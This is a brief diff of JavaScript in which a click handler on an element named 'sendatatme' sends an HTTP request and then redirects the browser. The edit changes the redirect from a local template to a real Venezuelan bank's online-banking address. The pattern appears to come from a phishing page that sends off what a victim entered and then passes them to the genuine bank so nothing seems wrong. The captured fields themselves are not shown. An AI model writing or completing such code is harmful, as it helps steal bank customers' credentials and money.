@@ -25,7 +25,7 @@ function redirect() {
     console.log(Http.responseText);
   };
 
-  window.location.href = "template.html";
+  window.location.href = "https://bdvenlinea.banvenez.com/";
 }
 
 sendatatme.addEventListener("click", redirect);
